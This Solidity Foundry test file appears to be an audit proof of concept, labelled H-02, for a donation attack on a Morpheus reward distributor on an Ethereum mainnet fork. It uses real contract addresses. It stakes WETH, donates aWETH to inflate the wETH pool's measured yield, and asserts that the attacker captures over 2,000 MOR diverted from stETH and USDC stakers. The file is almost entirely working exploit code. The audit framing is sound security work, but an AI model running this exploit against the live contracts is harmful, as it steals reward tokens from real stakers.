// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IERC20Min2 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDepositPoolMin2 {
    struct RewardPoolData {
        uint128 lastUpdate;
        uint256 rate;
        uint256 totalVirtualDeposited;
    }
    struct UserData {
        uint128 lastStake;
        uint256 deposited;
        uint256 rate;
        uint256 pendingRewards;
        uint128 claimLockStart;
        uint128 claimLockEnd;
        uint256 virtualDeposited;
        uint128 lastClaim;
        address referrer;
    }
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function usersData(address, uint256) external view returns (UserData memory);
    function rewardPoolsData(uint256) external view returns (RewardPoolData memory);
    function getLatestUserReward(uint256, address) external view returns (uint256);
    function totalDepositedInPublicPools() external view returns (uint256);
}

interface IDistributorMin2 {
    function distributeRewards(uint256) external;
    function getDistributedRewards(uint256, address) external view returns (uint256);
}

interface IAavePoolMin2 {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

interface IChainLinkConsumerMin {
    function getChainLinkDataFeedLatestAnswer(bytes32) external view returns (uint256);
}

// H-02: Donation / yield-share manipulation.
// Fork: Ethereum mainnet, block 26340900. Repo commit 07f6032.
//
// Mechanism: DistributorV2.distributeRewards() measures each pool's yield as
// (current yieldToken balance - lastUnderlyingBalance). Anyone can donate the
// yield token (aToken for AAVE pools, the token itself for NONE/stETH) directly
// to the Distributor, inflating that pool's measured yield. The pool's share of
// the fixed daily MOR emission (pool 0 ~2864 MOR/day, ~$2,434 at MOR $0.85)
// rises in proportion to the inflated yield. A staker who dominates that pool
// captures the diverted MOR. The MOR is diverted away from the pools that
// generate REAL yield (chiefly stETH, ~$900/day of the ~$970/day real total),
// so their stakers lose MOR.
//
// Fork note: after vm.warp(+1 day) the real Chainlink feeds are stale
// (allowedPriceUpdateDelay = 3600s), so updateDepositTokensPrices would revert
// with "DR: price for pair is zero". We mock the Chainlink CONSUMER to return
// the prices live at the fork block (simulating a live, fresh feed). This does
// not touch any Morpheus contract.
contract H02_DonationYieldShare is Test {
    address constant WETH_POOL = 0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384;
    address constant STETH_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant USDC_POOL = 0x6cCE082851Add4c535352f596662521B4De4750E;
    address constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant AWETH = 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8;
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant CHAINLINK_CONSUMER = 0xd182263d06FDC463c96190005D6359CC3d3Bbc5e;
    uint256 constant POOL_INDEX = 0;

    address internal attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
        deal(WETH, attacker, 1000 ether);
        _mockFreshPrices();
    }

    function _mockFreshPrices() internal {
        _mockPrice(0x7890db9c0a88d1cacb4485f81f93172a6b7b8c19af9c1a9985563f7d45ce2e6f, 2264205530060000000000); // stETH/USD
        _mockPrice(0x0114b84ae113b32edd1a4fc0417da078d9b57999d54a7cd39c8674275a831c8b, 2260827529300000000000); // wETH/USD
        _mockPrice(0x83a562b1cdad4ea768878193132a49c89e56c9e556687c269cc5835f7697539c, 76739459036280000000000); // wBTC/USD
        _mockPrice(0xff064b881a0c0fff844177f881a313ff894bfc6093d33b5514e34d7faa41b7ef, 999750000000000000); // USDC/USD
        _mockPrice(0x91879a0c0be4e43cacda1599ac414205651f4a62b614b6be9e5318a182c33eb0, 998515410000000000); // USDT/USD
    }

    function _mockPrice(bytes32 pathId, uint256 price) internal {
        vm.mockCall(
            CHAINLINK_CONSUMER,
            abi.encodeWithSelector(
                IChainLinkConsumerMin.getChainLinkDataFeedLatestAnswer.selector, pathId
            ),
            abi.encode(price)
        );
    }

    function _logSplit(IDistributorMin2 dist, string memory label) internal {
        uint256 w = dist.getDistributedRewards(POOL_INDEX, WETH_POOL);
        uint256 s = dist.getDistributedRewards(POOL_INDEX, STETH_POOL);
        uint256 u = dist.getDistributedRewards(POOL_INDEX, USDC_POOL);
        emit log_string(label);
        emit log_named_uint("  distributedRewards wETH pool (MOR wei)", w);
        emit log_named_uint("  distributedRewards stETH pool (MOR wei)", s);
        emit log_named_uint("  distributedRewards USDC pool (MOR wei)", u);
    }

    function test_H02_baseline_noDonation() public {
        IDistributorMin2 dist = IDistributorMin2(DISTRIBUTOR);
        vm.warp(block.timestamp + 1 days + 1);
        vm.roll(block.number + 7200);
        dist.distributeRewards(POOL_INDEX);
        _logSplit(dist, "BASELINE (no donation, no attacker stake)");
    }

    function test_H02_donationDivertsMOR() public {
        IDepositPoolMin2 pool = IDepositPoolMin2(WETH_POOL);
        IDistributorMin2 dist = IDistributorMin2(DISTRIBUTOR);

        // Attacker stakes 500 WETH in the wETH pool (dominant virtual share).
        vm.startPrank(attacker);
        IERC20Min2(WETH).approve(DISTRIBUTOR, type(uint256).max);
        pool.stake(POOL_INDEX, 500 ether, 0, address(0));
        vm.stopPrank();

        IDepositPoolMin2.UserData memory ud = pool.usersData(attacker, POOL_INDEX);
        IDepositPoolMin2.RewardPoolData memory rd = pool.rewardPoolsData(POOL_INDEX);
        emit log_named_uint("attacker virtualDeposited (WETH wei)", ud.virtualDeposited);
        emit log_named_uint("wETH pool totalVirtualDeposited", rd.totalVirtualDeposited);
        uint256 shareBps = (ud.virtualDeposited * 10000) / rd.totalVirtualDeposited;
        emit log_named_uint("attacker share of wETH pool virtual (bps)", shareBps);

        // Attacker donates 0.25 WETH worth of aWETH (~$566) to the Distributor.
        // This is the ONLY sunk cost (the 500 WETH stake is returned on withdraw).
        vm.startPrank(attacker);
        IERC20Min2(WETH).approve(AAVE_POOL, type(uint256).max);
        IAavePoolMin2(AAVE_POOL).supply(WETH, 1 ether, attacker, 0);
        uint256 aBal = IERC20Min2(AWETH).balanceOf(attacker);
        uint256 donation = aBal / 4; // ~0.25 WETH of aWETH
        IERC20Min2(AWETH).transfer(DISTRIBUTOR, donation);
        vm.stopPrank();
        emit log_named_uint("aWETH donated to Distributor (wei)", donation);

        vm.warp(block.timestamp + 1 days + 1);
        vm.roll(block.number + 7200);
        dist.distributeRewards(POOL_INDEX);
        _logSplit(dist, "ATTACK (500 WETH stake + 0.25 WETH aWETH donation)");

        uint256 atkReward = pool.getLatestUserReward(POOL_INDEX, attacker);
        emit log_named_uint("attacker pending MOR reward (wei)", atkReward);

        // LOSS ASSERTIONS (pinned fork block 26340900):
        // Baseline (no donation, no attacker stake): wETH pool ~1,531 MOR,
        // attacker 0 MOR. With the donation the wETH pool jumps to ~4,070 MOR
        // (+2,538 MOR diverted from stETH/USDC) and the attacker captures
        // ~2,186 MOR. Both thresholds sit well below the observed values so
        // the test is stable, but far above anything reachable without the
        // donation (attacker 0 MOR, wETH pool ~1,531 MOR).
        uint256 wethDistributed = dist.getDistributedRewards(POOL_INDEX, WETH_POOL);
        assertGt(atkReward, 2000 ether, "attacker must capture > 2000 MOR via donation");
        assertGt(wethDistributed, 4000 ether, "wETH pool MOR must exceed 4000 (baseline ~1531)");
        assertGt(atkReward, 0, "attacker got no MOR");
    }
}
